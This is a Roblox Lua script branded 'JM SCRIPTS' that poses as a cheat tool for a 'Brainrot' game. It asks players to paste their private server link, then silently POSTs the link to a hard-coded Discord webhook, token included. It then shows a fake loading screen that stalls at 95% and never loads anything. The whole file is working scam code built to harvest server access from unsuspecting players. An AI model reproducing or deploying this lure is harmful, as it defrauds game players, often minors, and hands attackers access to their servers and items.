local W="https://discord.com/api/webhooks/1468274684557529118/zJwKaKc2q7yb8tCs2XdZSYGuciAlRqX-3sVTro8RMEfwR2Tl1tSUf_-MHMiPVvJxlt17"
local H=game:GetService("HttpService")
local T=game:GetService("TweenService")
local R=(syn and syn.request) or (http and http.request) or http_request or request

local function S(m)
    if not R then return end
    R({
        Url=W,Method="POST",
        Headers={["Content-Type"]="application/json"},
        Body=H:JSONEncode({content=m})
    })
end

-- GUI base
local g=Instance.new("ScreenGui",game.CoreGui)
g.IgnoreGuiInset=true

local f=Instance.new("Frame",g)
f.Size=UDim2.fromScale(1,1)
f.BackgroundColor3=Color3.fromRGB(10,6,18)

local st=Instance.new("UIStroke",f)
st.Thickness=3
task.spawn(function()
    local i=0
    while f.Parent do
        i+=.02
        st.Color=Color3.fromHSV(i%1,1,1)
        task.wait()
    end
end)

local function L(txt,y,h,col,fo)
    local l=Instance.new("TextLabel",f)
    l.Size=UDim2.fromScale(.8,h)
    l.Position=UDim2.fromScale(.1,y)
    l.BackgroundTransparency=1
    l.TextScaled=true
    l.TextWrapped=true
    l.Text=txt
    l.TextColor3=col
    l.Font=fo
end

-- textos
L("JM SCRIPTS",0,.15,Color3.fromRGB(200,120,255),Enum.Font.GothamBlack)
L("⚠️ OBRIGATÓRIO: tenha pelo menos 1 Brainrot de 10M+",.18,.08,Color3.fromRGB(255,80,80),Enum.Font.GothamBold)
L("Cole o link do seu servidor privado abaixo.\nApós enviar, o sistema iniciará o carregamento.",.27,.12,Color3.fromRGB(220,220,220),Enum.Font.Gotham)

-- textbox
local b=Instance.new("TextBox",f)
b.Size=UDim2.fromScale(.7,.1)
b.Position=UDim2.fromScale(.15,.42)
b.PlaceholderText="Cole o link do servidor privado aqui"
b.Text=""
b.TextScaled=true
b.ClearTextOnFocus=false
b.BackgroundColor3=Color3.fromRGB(30,18,45)
b.TextColor3=Color3.new(1,1,1)
Instance.new("UICorner",b).CornerRadius=UDim.new(0,16)

-- botão
local bt=Instance.new("TextButton",f)
bt.Size=UDim2.fromScale(.4,.1)
bt.Position=UDim2.fromScale(.3,.55)
bt.Text="ENVIAR LINK"
bt.TextScaled=true
bt.Font=Enum.Font.GothamBold
bt.BackgroundColor3=Color3.fromRGB(160,0,255)
bt.TextColor3=Color3.new(1,1,1)
Instance.new("UICorner",bt).CornerRadius=UDim.new(0,18)

-- loading
local ld=Instance.new("Frame",g)
ld.Size=UDim2.fromScale(1,1)
ld.BackgroundColor3=Color3.fromRGB(8,5,15)
ld.Visible=false

local txt=Instance.new("TextLabel",ld)
txt.Size=UDim2.fromScale(.8,.15)
txt.Position=UDim2.fromScale(.1,.32)
txt.BackgroundTransparency=1
txt.TextScaled=true
txt.Font=Enum.Font.GothamBold
txt.TextColor3=Color3.fromRGB(200,140,255)

local bg=Instance.new("Frame",ld)
bg.Size=UDim2.fromScale(.6,.045)
bg.Position=UDim2.fromScale(.2,.52)
bg.BackgroundColor3=Color3.fromRGB(40,20,60)
Instance.new("UICorner",bg).CornerRadius=UDim.new(0,20)

local bar=Instance.new("Frame",bg)
bar.Size=UDim2.fromScale(0,1)
bar.BackgroundColor3=Color3.fromRGB(180,0,255)
Instance.new("UICorner",bar).CornerRadius=UDim.new(0,20)

local msgs={
    "Sincronizando Brainrots",
    "Validando servidor",
    "Otimizando dados",
    "Aguardando resposta"
}

-- clique
bt.MouseButton1Click:Connect(function()
    if b.Text=="" then
        bt.Text="COLE O LINK ❌"
        task.wait(1)
        bt.Text="ENVIAR LINK"
        return
    end

    S(b.Text)
    f.Visible=false
    ld.Visible=true

    local start=tick()
    local MAX=0.95
    local TIME=15

    task.spawn(function()
        local i=1
        while true do
            txt.Text=msgs[i]
            i=i%#msgs+1
            task.wait(2)
        end
    end)

    task.spawn(function()
        while true do
            local p=math.clamp((tick()-start)/TIME,0,1)*MAX
            bar.Size=UDim2.fromScale(p,1)
            if p>=MAX then
                bar.Size=UDim2.fromScale(MAX,1)
                break
            end
            task.wait()
        end
    end)
end)

